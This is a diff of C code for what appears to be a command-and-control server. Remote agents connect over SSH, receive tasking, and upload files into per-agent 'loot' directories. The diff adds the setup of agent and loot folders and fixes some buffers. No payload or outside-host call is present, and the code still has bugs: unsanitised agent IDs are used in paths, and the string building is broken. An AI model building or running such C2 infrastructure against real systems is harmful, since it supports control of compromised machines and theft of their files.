@@ -237,30 +237,25 @@ int index_of(char* str, char find, int rev){
 
 int directory_exists( const char* pzPath ){
     /*Tests if a directory exists in the file system */
-    if ( pzPath == NULL) return 0;
-    DIR *pDir;
-    int bExists = 0;
-    pDir = opendir (pzPath);
-    if (pDir != NULL)
-    {
-        bExists = 1;
-        (void) closedir (pDir);
+    struct stat st = {0};
+
+    if (stat(pzPath, &st) == -1) {
+        return 0;
     }
-
-   return bExists;
-}
-
-
-int check_if_exist(char *agent_id) {
-    if(directory_exists(strcat("agents/", agent_id))){
-        return 1;
-    }
-    return 0;
+    return 1;
+    
 }
 
 void init_agent(char *agent_id){
     FILE *fd = NULL;
-    fd = fopen(strcat("agents/", agent_id), "w");
+    char buff[2048];
+    memset(buff, 0, sizeof(buff));
+    strcat(buff, "agents/");
+    strcat(buff, agent_id);
+    mkdir(buff, 0666);
+    mkdir(strcat(buff, "loot"), 0666);
+
+    fd = fopen(strcat(buff, "agent.mfst"), "w");
     char data[512];
 
     /*
@@ -273,6 +268,7 @@ void init_agent(char *agent_id){
 }
 
 int get_tasking(char *agent_id, char *tasking){
+    strcat(tasking, "NULL :)");
     return 0;
 }
 
@@ -296,7 +292,7 @@ int get_file(char *name, char *ptr){
 }
 
 void clean_input(char *input){
-    int offset = index_of(input, "/", 1);
+    int offset = index_of(input, '/', 1);
     input = input +offset;
 }
 
@@ -306,6 +302,7 @@ void agent_handler(struct clientDat agent){
 
     int operation = -1;
     int quitting = 0;
+    int size = 0;
     char buff[2048];
             
     while (!quitting)
@@ -344,7 +341,7 @@ void agent_handler(struct clientDat agent){
             char *dat_ptr;
 
             // get filesize 
-            int size = get_file(buff, dat_ptr);
+            size = get_file(buff, dat_ptr);
             if(size < 0){
                 printf("Client %d: filename '%s' does not exist\n", agent.id, buff); 
                 ssh_channel_write(agent.chan, "er", 3);
@@ -370,7 +367,6 @@ void agent_handler(struct clientDat agent){
             ssh_channel_read(agent.chan, filename, sizeof(filename), 0);
             
             // get size and allocate memory segment
-            int size = 0;
             ssh_channel_write(agent.chan, "ok", 3);
             ssh_channel_read(agent.chan, (char *) &size, 1, 0);
             char *data_ptr = malloc(size);
@@ -404,6 +400,21 @@ void agent_handler(struct clientDat agent){
     }
     
     
+}
+
+void init(){
+    struct stat st = {0};
+
+    if (stat("loot", &st) == -1) {
+        mkdir("loot", 0666);
+        printf("Server: initialized directory 'loot'\n");
+    }
+
+    if (stat("agents", &st) == -1) {
+        mkdir("agents", 0666);
+        printf("Server: initialized directory 'agents'\n");
+    }
+
 }
 
 
@@ -499,17 +510,23 @@ void *ssh_handler(void* sess){
     case REQ_TASKING:
         // Get agent ID
         //char agent_id[128];
-        ssh_channel_read(pass.chan, agent_id, strlen(agent_id), 0);
+        ssh_channel_read(pass.chan, agent_id, sizeof(agent_id), 0);
         printf("Client %d: got identifier: %s\n", pass.id, agent_id);
 
         // Check if ID exists
-        int exists = check_if_exist(agent_id);
+        memset(buf, 0, sizeof(buf));
+        strcat(buf, "agents/");
+        int exists = directory_exists(strcat(buf, agent_id));
+        printf("Checked if it exists: %d\n", exists);
+
         if(!exists){
             init_agent(agent_id);
         }
+        printf("Client %d: Initialized agent\n");
         char tasking[2048];
+        memset(tasking, 0, sizeof(tasking));
         get_tasking(agent_id, tasking);
-
+        
         ssh_channel_write(pass.chan, tasking, strlen(tasking));
         
         // Pass to handler
@@ -561,6 +578,8 @@ int main(int argc, char **argv){
     int master_socket;
     int ctr = 0;
     pthread_t thread;
+
+    init();
     
     for (size_t i = 0; i < MAX_CONN; i++)
     {
